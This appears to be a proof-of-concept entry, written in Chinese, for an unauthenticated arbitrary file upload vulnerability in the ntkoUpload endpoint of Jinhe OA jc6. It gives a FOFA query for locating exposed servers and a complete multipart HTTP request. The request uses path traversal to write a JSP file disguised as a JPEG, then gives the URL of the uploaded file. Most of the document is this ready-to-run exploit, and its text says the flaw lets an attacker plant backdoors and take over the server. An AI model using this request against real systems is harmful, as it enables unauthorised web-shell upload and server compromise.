## 金和OA_jc6_ntko-upload任意文件上传漏洞

金和OA jc6系统ntkoUpload接口处存在任意文件上传漏洞，未经身份认证的攻击者可利用此漏洞上传恶意后门文件，最终可导致服务器失陷。

## fofa
```
app="金和网络-金和OA"
```

## poc
```
POST /jc6/ntkoUpload/ntko-upload!upload.action HTTP/1.1
Host: you_ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Content-Length: 392
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=----zqulxi4ku42pfmoelvc0
Connection: close

------zqulxi4ku42pfmoelvc0
Content-Disposition: form-data; name="filename"

../../../../upload/xicxc2sv1n.jsp
------zqulxi4ku42pfmoelvc0
Content-Disposition: form-data; name="upLoadFile"; filename="xicxc2sv1n.jpg"
Content-Type: image/jpeg

<% out.println(111*111); %>
------zqulxi4ku42pfmoelvc0
Content-Disposition: form-data; name="Submit"

upload
------zqulxi4ku42pfmoelvc0--
```

![image](https://github.com/wy876/POC/assets/139549762/5961c079-2af6-4449-aa69-b5cb30ecb4b1)

上传文件路径：
http://you_ip/upload/xicxc2sv1n.jsp


![image](https://github.com/wy876/POC/assets/139549762/8fd1879a-11ab-4dde-9821-665d3e6ceb49)

